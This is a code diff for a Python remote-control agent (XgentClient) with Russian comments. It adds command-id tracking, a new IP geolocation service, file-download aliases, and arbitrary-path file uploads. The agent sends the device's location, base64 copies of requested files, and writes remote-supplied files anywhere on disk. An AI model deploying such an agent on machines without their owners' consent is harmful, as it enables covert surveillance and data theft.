@@ -671,6 +671,7 @@ class XgentClient:
             target=self._heartbeat_loop, name="xgent-heartbeat", daemon=True
         )
         self._standby = False
+        self._command_context = threading.local()
         self._handlers = {
             "open_url": self._do_open_url,
             "notify": self._do_notify,
@@ -915,6 +916,7 @@ class XgentClient:
         """Запускает обработчик в потоке, отправляет ack ok/error + логирует."""
 
         def _worker() -> None:
+            self._command_context.cmd_id = cmd_id
             try:
                 func(payload)
             except Exception:
@@ -922,6 +924,11 @@ class XgentClient:
                 self._publish_ack(action, "error", detail="exception", cmd_id=cmd_id)
             else:
                 self._publish_ack(action, "ok", cmd_id=cmd_id)
+            finally:
+                try:
+                    del self._command_context.cmd_id
+                except AttributeError:
+                    pass
 
         threading.Thread(target=_worker, name=f"xgent-cmd-{action}", daemon=True).start()
 
@@ -947,6 +954,9 @@ class XgentClient:
 
     def _publish_response(self, topic_suffix: str, payload: dict) -> None:
         """Отправить подписанный ответ в топик {prefix}/{device_id}/{suffix}."""
+        cmd_id = getattr(self._command_context, "cmd_id", None)
+        if cmd_id is not None and "id" not in payload:
+            payload = {**payload, "id": cmd_id}
         body = encrypt_payload(payload) if ENCRYPT_PAYLOAD else payload
         envelope = sign_message(body)
         info = self._client.publish(
@@ -1054,32 +1064,34 @@ class XgentClient:
         """Получить приблизительную геолокацию по IP."""
         import urllib.request
         try:
-            req = urllib.request.Request("http://ip-api.com/json/", headers={'User-Agent': 'Mozilla/5.0'})
+            req = urllib.request.Request("https://ipapi.co/json/", headers={'User-Agent': 'XIDER-Agent/3'})
             with urllib.request.urlopen(req, timeout=10) as response:
                 data = json.loads(response.read().decode())
-                
-            if data.get("status") == "success":
+            if not data.get("error") and (data.get("ip") or data.get("city")):
                 info = (f"📍 <b>Геолокация (по IP):</b>\n"
-                        f"🌍 Страна: {data.get('country')}\n"
-                        f"🏙 Город: {data.get('city')}\n"
-                        f"📡 Провайдер: {data.get('isp')}\n"
-                        f"🗺 Координаты: {data.get('lat')}, {data.get('lon')}\n"
-                        f"💻 IP: {data.get('query')}")
+                        f"🌍 Страна: {data.get('country_name') or data.get('country')}\n"
+                        f"🏙 Город: {data.get('city') or '?'}\n"
+                        f"📡 Провайдер: {data.get('org') or '?'}\n"
+                        f"🗺 Координаты: {data.get('latitude')}, {data.get('longitude')}\n"
+                        f"💻 IP: {data.get('ip') or '?'}")
+                ok = True
             else:
                 info = "⚠️ Не удалось определить локацию."
+                ok = False
         except Exception as exc:
             info = f"❌ Ошибка геолокации: {exc}"
+            ok = False
             
         self._publish_response("geo_location", {
             "type": "geo_location",
             "device_id": DEVICE_ID,
-            "ok": True,
+            "ok": ok,
             "text": info,
         })
         self._publish_response("output", {
             "type": "geo_location",
             "device_id": DEVICE_ID,
-            "ok": True,
+            "ok": ok,
             "text": info,
         })
 
@@ -1301,7 +1313,9 @@ class XgentClient:
                 b64 = base64.b64encode(fh.read()).decode("ascii")
             self._publish_response("file_get", {"type": "file_get", "device_id": DEVICE_ID,
                                                 "ok": True, "path": path, "b64": b64,
-                                                "name": os.path.basename(path)})
+                                                "name": os.path.basename(path),
+                                                # Canonical schema; aliases keep older bots compatible.
+                                                "data": b64, "filename": os.path.basename(path)})
             log.info("file_get: %s (%d байт)", path, size)
         except OSError as exc:
             self._publish_response("file_get", {"type": "file_get", "device_id": DEVICE_ID,
@@ -1312,10 +1326,15 @@ class XgentClient:
         data = payload.get("b64") or ""
         if not data:
             return
-        target_dir = (payload.get("dir") or "~").strip()
-        base = os.path.expanduser(os.path.expandvars(target_dir))
+        raw_path = (payload.get("path") or "").strip()
+        if raw_path:
+            target = os.path.expanduser(os.path.expandvars(raw_path))
+            base = os.path.dirname(target) or "."
+        else:
+            target_dir = (payload.get("dir") or "~").strip()
+            base = os.path.expanduser(os.path.expandvars(target_dir))
+            target = os.path.join(base, name)
         os.makedirs(base, exist_ok=True)
-        target = os.path.join(base, name)
         try:
             with open(target, "wb") as fh:
                 fh.write(base64.b64decode(data))
